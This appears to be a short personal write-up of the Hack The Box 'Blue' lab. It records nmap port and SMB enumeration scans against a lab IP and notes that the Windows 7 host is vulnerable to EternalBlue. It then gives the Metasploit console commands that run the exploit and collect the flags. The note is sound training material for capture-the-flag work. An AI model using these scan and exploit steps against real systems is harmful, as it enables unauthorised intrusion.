---
tags:
banner:
publish: false
---
```
nmap -p- -sV -sC 10.129.1.108
```

a Lot of ports are open to the outside

Dont forget to look at the OS version number !!

Windows 7 PRO 7601  V 6.1
 
- 135 - Microsoft windows RPC
- 139 - Microsoft windows netbios-ssn
- 445 - Microsoft-ds
- 49152-49157 - Microsoft windows RPC

Script results:
![[Vault-data/Attachments/Blue - Easy box.png]]

```
nmap -p- -sV --script=banner 10.129.1.108
```
banner grabbing, nothing special


```
nmap -p- -sV --script=smb-enum-users 10.129.1.108
```
smb user enumeration

```
nmap -p- -sV --script=msrpc-enum 10.129.1.108
```
microsoft rpc enumeration


Microsoft windows 7 version is vulnerable to ETERNAL BLUE

using metasploit to run the exploit

```bash
msfconsole

search eternal

use 2 # Windows 7 target
set RHOSTS 10.129.1.108
set LHOST [local ip]
run
```

flags are in desktop folder
yay !!


